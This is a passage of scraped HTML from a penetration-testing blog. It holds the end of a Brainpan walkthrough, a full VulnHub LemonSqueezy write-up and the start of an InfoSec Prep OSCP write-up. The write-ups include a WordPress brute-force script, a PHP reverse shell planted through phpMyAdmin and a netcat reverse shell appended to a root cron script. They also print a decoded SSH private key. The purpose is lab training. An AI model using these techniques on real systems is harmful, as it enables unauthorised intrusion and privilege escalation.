</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>puck<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>puck<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1001<span class="o">(</span>anansi<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>anansi<span class="o">)</span>,1002<span class="o">(</span>puck<span class="o">)</span>
<span class="nv">$ </span><span class="nb">whoami
</span>anansi
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>Listing the sudo permissions I discovered that we can run a binary called anansi_util without password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>                                                                                                                                                           
<span class="nb">sudo</span> <span class="nt">-l</span>                                                                                                                                                             
Matching Defaults entries <span class="k">for </span>puck on this host:                                                                                                                    
    env_reset, mail_badpass,                                                                                                                                        
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin                                                                                   
                                                                                                                                                                    
User puck may run the following commands on this host:                                                                                                              
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /home/anansi/bin/anansi_util
</code></pre></div></div>

<p>In this binary the manual page is allowed, we can leverage of this to get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /home/anansi/bin/anansi_util
<span class="nb">sudo</span> /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util <span class="o">[</span>action]
Where <span class="o">[</span>action] is one of:
  - network
  - proclist
  - manual <span class="o">[</span><span class="nb">command</span><span class="o">]</span>
</code></pre></div></div>

<p>To elevate our privileges to root I typed into the bash manual !/bin/bash, as follows.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /home/anansi/bin/anansi_util manual bash
<span class="nb">sudo</span> /home/anansi/bin/anansi_util manual bash
No manual entry <span class="k">for </span>manual
WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)!</span>/bin/bash
<span class="o">!</span>/bin/bash
root@brainpan:/usr/share/man# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@brainpan:/usr/share/man# <span class="nb">cd
cd
</span>root@brainpan:~# <span class="nb">ls
ls
</span>b.txt
root@brainpan:~# <span class="nb">cat </span>b.txt
<span class="nb">cat </span>b.txt
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 

</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - LemonSqueezy</h1>
	<p class="post-date text-bold text-upcase">
	<span>October 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This is a boot2root in a similar style to ones like Mr Robot, Lazysysadmin and MERCY.</p>

<p><strong>Author:</strong> James Hay</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/lemonsqueezy-1,473/">https://www.vulnhub.com/entry/lemonsqueezy-1,473/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>With nmap I did a ping scan on the local network to detect the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.1/24
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-24 17:57 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.158
Host is up <span class="o">(</span>0.00061s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:0C:29:E2:78:CF <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.254
Host is up <span class="o">(</span>0.00016s latency<span class="o">)</span><span class="nb">.</span>
MAC Address: 00:50:56:FA:F3:F9 <span class="o">(</span>VMware<span class="o">)</span>
Nmap scan report <span class="k">for </span>192.168.179.1
Host is up.
Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>4.60 seconds
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>Then I performed a full TCP port scan to detect available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T5</span> <span class="nt">--open</span> <span class="nt">-p-</span> 192.168.179.158 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
80/tcp open  http
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>With nmap I did service and OS detection, script scanning and traceroute on the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p80</span> <span class="nt">-A</span> 192.168.179.158 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Apache2 Debian Default Page: It works
</code></pre></div></div>

<h2 id="web-enumeration">Web Enumeration</h2>

<p>In the web service the apache web page is running, but I didn’t find anything else.</p>

<p><img src="/assets/images/lemonsqueezy/screenshot-1.png" alt="" /></p>

<p>So I ran wfuzz to find hidden directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span> 404  <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://192.168.179.158/FUZZ
...
000000587:   301        9 L      28 W       322 Ch      <span class="s2">"wordpress"</span>  
000000730:   301        9 L      28 W       319 Ch      <span class="s2">"manual"</span>     
000001073:   301        9 L      28 W       323 Ch      <span class="s2">"javascript"</span>  
000010825:   301        9 L      28 W       323 Ch      <span class="s2">"phpmyadmin"</span>
</code></pre></div></div>

<p>In the wfuzz output we can see the wordpress directory, I accessed it but I had problems with the page resolution.</p>

<p><img src="/assets/images/lemonsqueezy/screenshot-2.png" alt="" /></p>

<p>In the page source I saw that’s requesting a domain name, to solve the page resolution we need to add the ip address and that domain name in the system hosts file.</p>

<p><img src="/assets/images/lemonsqueezy/screenshot-3.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'192.168.179.158 lemonsqueezy'</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<p><img src="/assets/images/lemonsqueezy/screenshot-4.png" alt="" /></p>

<p>Then I enumerated the wordpress CMS, found a writable web directory and two users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://lemonsqueezy/wordpress/ <span class="nt">-e</span> vp,vt,u
...
<span class="o">[</span>+] Upload directory has listing enabled: http://lemonsqueezy/wordpress/wp-content/uploads/
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>                                      
 | Confidence: 100%
 ...
<span class="o">[</span>i] User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] lemon
 | Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
 | Confirmed By:
 |  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |   - http://lemonsqueezy/wordpress/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
 |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+] orange
 | Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
...
</code></pre></div></div>

<p>I developed a python script to brute force the login page.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>

import requests
import os
import threading
from queue import Queue
from colorama import init,Fore

init<span class="o">()</span>
<span class="nv">green</span><span class="o">=</span>Fore.GREEN
<span class="nv">gray</span><span class="o">=</span>Fore.LIGHTBLACK_EX
<span class="nv">reset</span><span class="o">=</span>Fore.RESET

<span class="nv">url</span><span class="o">=</span><span class="s2">"http://lemonsqueezy/wordpress/wp-login.php"</span>
<span class="nv">user</span><span class="o">=</span><span class="s2">"orange"</span>
<span class="nv">print_lock</span><span class="o">=</span>threading.Lock<span class="o">()</span>

def bflogin<span class="o">(</span>passwd<span class="o">)</span>:
    <span class="nv">data</span><span class="o">={</span>
            <span class="s1">'log'</span>:user,
            <span class="s1">'pwd'</span>:passwd,
            <span class="s1">'wp-submit'</span>:<span class="s1">'Log+In'</span>
            <span class="o">}</span>

    <span class="nv">r</span><span class="o">=</span>requests.post<span class="o">(</span>url,data<span class="o">=</span>data<span class="o">)</span>

    <span class="k">if</span> <span class="s1">'ERROR'</span> not <span class="k">in </span>r.text:
        with print_lock:
            print<span class="o">(</span>f<span class="s2">"{green}[+] Found: {passwd:20}{reset}"</span><span class="o">)</span>
            os._exit<span class="o">(</span>1<span class="o">)</span>
    <span class="k">else</span>:
        with print_lock:
            print<span class="o">(</span>f<span class="s2">"{gray}[-] Password {passwd:15}{reset}"</span>, <span class="nv">end</span><span class="o">=</span><span class="s1">'\r'</span><span class="o">)</span>

def threader<span class="o">()</span>:
    <span class="k">while </span>True:
        <span class="nv">worker</span><span class="o">=</span>q.get<span class="o">()</span>
        bflogin<span class="o">(</span>worker<span class="o">)</span>
        q.task_done<span class="o">()</span>

<span class="nv">q</span><span class="o">=</span>Queue<span class="o">()</span>

<span class="k">for </span>x <span class="k">in </span>range<span class="o">(</span>10<span class="o">)</span>:
    <span class="nv">t</span><span class="o">=</span>threading.Thread<span class="o">(</span><span class="nv">target</span><span class="o">=</span>threader<span class="o">)</span>
    t.daemon<span class="o">=</span>True
    t.start<span class="o">()</span>

<span class="nv">wordlist</span><span class="o">=</span>open<span class="o">(</span><span class="s2">"/opt/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"</span><span class="o">)</span>.read<span class="o">()</span>.splitlines<span class="o">()</span>

<span class="k">for </span>p <span class="k">in </span>wordlist:
    q.put<span class="o">(</span>p<span class="o">)</span>

q.join<span class="o">()</span>
</code></pre></div></div>

<p>I ran the script, after a few seconds I found the password for the orange user, and logged in.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root@kali:~<span class="nv">$ </span>python3 wpbforce.py
<span class="o">[</span>+] Found: ginger
</code></pre></div></div>

<p><img src="/assets/images/lemonsqueezy/screenshot-5.png" alt="" /></p>

<p>In the posts I found a string, possibly a password.</p>

<p><img src="/assets/images/lemonsqueezy/screenshot-6.png" alt="" /></p>

<p>So I tried to log in to phpMyAdmin as the orange user with the password <strong>n0t1n@w0rdl1st!</strong>.</p>

<p><img src="/assets/images/lemonsqueezy/screenshot-7.png" alt="" /></p>

<p>I had successful access, so we can see the password hashes of wordpress and try to crack them.</p>

<p><img src="/assets/images/lemonsqueezy/screenshot-8.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="phpmyadmin">phpMyAdmin</h3>

<p>I tried to write a file on the server in the wordpress uploads directory that I found previously, this is allow since this has write permissions, in this case was possible to write the phpinfo function.</p>

<p><img src="/assets/images/lemonsqueezy/screenshot-9.png" alt="" /></p>

<p><img src="/assets/images/lemonsqueezy/screenshot-10.png" alt="" /></p>

<p>I used a pentestmonkey php reverse shell, I changed the IP addres with the IP of the attacking machine and the port, then I encoded it to hexadecimal and wrote it in the uploads directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/192.168.179.1/;s/1234/443/'</span> shell.php 
root@kali:~<span class="nv">$ </span>xxd <span class="nt">-ps</span> shell.php | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> c
</code></pre></div></div>

<p><img src="/assets/images/lemonsqueezy/screenshot-11.png" alt="" /></p>

<p>Then we need to set up a netcat listener and run the following curl instruction.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://lemonsqueezy/wordpress/wp-content/uploads/z.php
</code></pre></div></div>

<p>As we see I got a shell and upgraded it to a TTY shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443                                               
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.158] 41036
Linux lemonsqueezy 4.9.0-4-amd64 <span class="c">#1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 GNU/Linux</span>
 09:57:59 up  2:32,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ python -c '</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
www-data@lemonsqueezy:/$
</span></code></pre></div></div>

<p>Listing the writable files, I found the logrotate python script, this removes the tmp directory, it also has write permissions for all users, I can use this script to elevate our privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@lemonsqueezy:/<span class="nv">$ </span>find / <span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null | egrep <span class="nt">-v</span> <span class="s1">'proc|sys'</span>
&lt;<span class="nt">-writable</span> <span class="nt">-type</span> f 2&gt;/dev/null | egrep <span class="nt">-v</span> <span class="s1">'proc|sys'</span>
/var/lib/wordpress/wp-content/index.php
/etc/logrotate.d/logrotate
www-data@lemonsqueezy:/<span class="nv">$ </span><span class="nb">cat</span> /etc/logrotate.d/logrotate
<span class="nb">cat</span> /etc/logrotate.d/logrotate
<span class="c">#!/usr/bin/env python</span>
import os
import sys
try:
   os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>
except:
    sys.exit<span class="o">()</span>
www-data@lemonsqueezy:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/logrotate.d/logrotate
<span class="nb">ls</span> <span class="nt">-la</span> /etc/logrotate.d/logrotate
<span class="nt">-rwxrwxrwx</span> 1 root root 101 Apr 26  2020 /etc/logrotate.d/logrotate
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="cron-job">Cron Job</h3>

<p>To get root I added a netcat reverse shell to logrotate script, started a netcat listener wait a minutes and I got a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@lemonsqueezy:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'os.system("nc 192.168.179.1 1331 -e /bin/bash ")'</span> <span class="o">&gt;&gt;</span> /etc/logrotate.d/logrotate

root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 1331
listening on <span class="o">[</span>any] 1331 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.158] 41410
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
script <span class="nt">-qc</span> /bin/bash /dev/null
root@lemonsqueezy:~# <span class="nb">ls
ls
</span>root.txt
root@lemonsqueezy:~# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
<span class="nv">NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4</span><span class="o">=</span>
</code></pre></div></div>


  
    <h1 class="post-title">VulnHub - InfoSec Prep OSCP</h1>
	<p class="post-date text-bold text-upcase">
	<span>October 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This machine was created for the InfoSec Prep Discord Server (https://discord.gg/RRgKaep) as a give way for a 30d voucher to the OSCP Lab, Lab materials, and an exam attempt.</p>

<p><strong>Author:</strong> FalconSpy</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> Find the flag.txt in /root/.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">https://www.vulnhub.com/entry/infosec-prep-oscp,508/</a></p>

<h1 id="information-gathering">Information Gathering</h1>
<h2 id="host-discovery">Host Discovery</h2>

<p>I discovered the target machine on the local network with netdiscover.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts

 7 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 402
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 <span class="nt">-----------------------------------------------------------------------------</span>
 192.168.179.157 00:0c:29:b9:57:e3      6     360  VMware, Inc.
 192.168.179.254 00:50:56:ee:43:01      1      42  VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>Then, I proceeded to perform a full TCP/UDP scan to find available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> <span class="nt">-p1-65535</span> 192.168.179.157 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> <span class="nt">-p1-65535</span> 192.168.179.157 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
adding 192.168.179.157/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `1-65535'</span> pps 3000
using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
TCP open 192.168.179.157:80  ttl 64
TCP open 192.168.179.157:22  ttl 64
TCP open 192.168.179.157:33060  ttl 64
sender statistics 2395.4 pps with 196605 packets sent total
listener statistics 390334 packets recieved 0 packets droped and 0 interface drops
TCP open                     ssh[   22]         from 192.168.179.157  ttl 64
TCP open                    http[   80]         from 192.168.179.157  ttl 64
TCP open                 unknown[33060]         from 192.168.179.157  ttl 64
adding 192.168.179.157/32 mode <span class="sb">`</span>UDPscan<span class="s1">' ports `1-65535'</span> pps 3000
using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>I did service and OS detection, script scanning and traceroute on the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p22</span>,80,33060 192.168.179.157 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 <span class="o">(</span>RSA<span class="o">)</span>
|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-generator: WordPress 5.4.2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/secret.txt
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: OSCP Voucher &amp;#8211<span class="p">;</span> Just another WordPress site
33060/tcp open  mysqlx?
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>On the web service a wordpress CMS is running, as we saw in the enumeration of services with nmap, the robots files is available, in this I found the secret.txt file.</p>

<p><img src="/assets/images/infosecpreposcp/screenshot-1.png" alt="" /></p>

<p><img src="/assets/images/infosecpreposcp/screenshot-2.png" alt="" /></p>

<p>This file contains a base64 string.</p>

<p><img src="/assets/images/infosecpreposcp/screenshot-3.png" alt="" /></p>

<p>I downloaded it and decoded it, this is an OPENSSH private key.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.157/secret.txt | <span class="nb">base64</span> <span class="nt">-d</span>
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtHCsSzHtUF8K8tiOqECQYLrKKrCRsbvq6iIG7R9g0WPv9w+gkUWe
IzBScvglLE9flolsKdxfMQQbMVGqSADnYBTavaigQekue0bLsYk/rZ5FhOURZLTvdlJWxz
bIeyC5a5F0Dl9UYmzChe43z0Do0iQw178GJUQaqscLmEatqIiT/2FkF+AveW3hqPfbrw9v
A9QAIUA3ledqr8XEzY//Lq0+sQg/pUu0KPkY18i6vnfiYHGkyW1SgryPh5x9BGTk3eRYcN
w6mDbAjXKKCHGM+dnnGNgvAkqT+gZWz/Mpy0ekauk6NP7NCzORNrIXAYFa1rWzaEtypHwY
kCEcfWJJlZ7+fcEFa5B7gEwt/aKdFRXPQwinFliQMYMmau8PZbPiBIrxtIYXy3MHcKBIsJ
0HSKv+HbKW9kpTL5OoAkB8fHF30ujVOb6YTuc1sJKWRHIZY3qe08I2RXeExFFYu9oLug0d
tHYdJHFL7cWiNv4mRyJ9RcrhVL1V3CazNZKKwraRAAAFgH9JQL1/SUC9AAAAB3NzaC1yc2
EAAAGBALRwrEsx7VBfCvLYjqhAkGC6yiqwkbG76uoiBu0fYNFj7/cPoJFFniMwUnL4JSxP
X5aJbCncXzEEGzFRqkgA52AU2r2ooEHpLntGy7GJP62eRYTlEWS073ZSVsc2yHsguWuRdA
5fVGJswoXuN89A6NIkMNe/BiVEGqrHC5hGraiIk/9hZBfgL3lt4aj3268PbwPUACFAN5Xn
aq/FxM2P/y6tPrEIP6VLtCj5GNfIur534mBxpMltUoK8j4ecfQRk5N3kWHDcOpg2wI1yig
hxjPnZ5xjYLwJKk/oGVs/zKctHpGrpOjT+zQszkTayFwGBWta1s2hLcqR8GJAhHH1iSZWe
/n3BBWuQe4BMLf2inRUVz0MIpxZYkDGDJmrvD2Wz4gSK8bSGF8tzB3CgSLCdB0ir/h2ylv
ZKUy+TqAJAfHxxd9Lo1Tm+mE7nNbCSlkRyGWN6ntPCNkV3hMRRWLvaC7oNHbR2HSRxS+3F
ojb+JkcifUXK4VS9VdwmszWSisK2kQAAAAMBAAEAAAGBALCyzeZtJApaqGwb6ceWQkyXXr
bjZil47pkNbV70JWmnxixY31KjrDKldXgkzLJRoDfYp1Vu+sETVlW7tVcBm5MZmQO1iApD
gUMzlvFqiDNLFKUJdTj7fqyOAXDgkv8QksNmExKoBAjGnM9u8rRAyj5PNo1wAWKpCLxIY3
BhdlneNaAXDV/cKGFvW1aOMlGCeaJ0DxSAwG5Jys4Ki6kJ5EkfWo8elsUWF30wQkW9yjIP
UF5Fq6udJPnmEWApvLt62IeTvFqg+tPtGnVPleO3lvnCBBIxf8vBk8WtoJVJdJt3hO8c4j
kMtXsvLgRlve1bZUZX5MymHalN/LA1IsoC4Ykg/pMg3s9cYRRkm+GxiUU5bv9ezwM4Bmko
QPvyUcye28zwkO6tgVMZx4osrIoN9WtDUUdbdmD2UBZ2n3CZMkOV9XJxeju51kH1fs8q39
QXfxdNhBb3Yr2RjCFULDxhwDSIHzG7gfJEDaWYcOkNkIaHHgaV7kxzypYcqLrs0S7C4QAA
AMEAhdmD7Qu5trtBF3mgfcdqpZOq6+tW6hkmR0hZNX5Z6fnedUx//QY5swKAEvgNCKK8Sm
iFXlYfgH6K/5UnZngEbjMQMTdOOlkbrgpMYih+ZgyvK1LoOTyMvVgT5LMgjJGsaQ5393M2
yUEiSXer7q90N6VHYXDJhUWX2V3QMcCqptSCS1bSqvkmNvhQXMAaAS8AJw19qXWXim15Sp
WoqdjoSWEJxKeFTwUW7WOiYC2Fv5ds3cYOR8RorbmGnzdiZgxZAAAAwQDhNXKmS0oVMdDy
3fKZgTuwr8My5Hyl5jra6owj/5rJMUX6sjZEigZa96EjcevZJyGTF2uV77AQ2Rqwnbb2Gl
jdLkc0Yt9ubqSikd5f8AkZlZBsCIrvuDQZCoxZBGuD2DUWzOgKMlfxvFBNQF+LWFgtbrSP
OgB4ihdPC1+6FdSjQJ77f1bNGHmn0amoiuJjlUOOPL1cIPzt0hzERLj2qv9DUelTOUranO
cUWrPgrzVGT+QvkkjGJFX+r8tGWCAOQRUAAADBAM0cRhDowOFx50HkE+HMIJ2jQIefvwpm
Bn2FN6kw4GLZiVcqUT6aY68njLihtDpeeSzopSjyKh10bNwRS0DAILscWg6xc/R8yueAeI
Rcw85udkhNVWperg4OsiFZMpwKqcMlt8i6lVmoUBjRtBD4g5MYWRANO0Nj9VWMTbW9RLiR
kuoRiShh6uCjGCCH/WfwCof9enCej4HEj5EPj8nZ0cMNvoARq7VnCNGTPamcXBrfIwxcVT
<span class="nv">8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A</span><span class="o">=</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
</code></pre></div></div>

<p>So I saved this private key to a file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.157/secret.txt | <span class="nb">base64</span> <span class="nt">-d</span>  <span class="o">&gt;</span> id_rsa
</code></pre></div></div>

<p>On the main page, in the following text I found the user <strong>oscp</strong>.</p>

<p><img src="/assets/images/infosecpreposcp/screenshot-4.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>Before to log in is necessary grant write and read privileges to private key file, then I logged in via ssh as the user oscp.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod </span>400 id_rsa

root@kali:~<span class="nv">$ </span>ssh oscp@192.168.179.157 <span class="nt">-i</span> id_rsa
Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-40-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
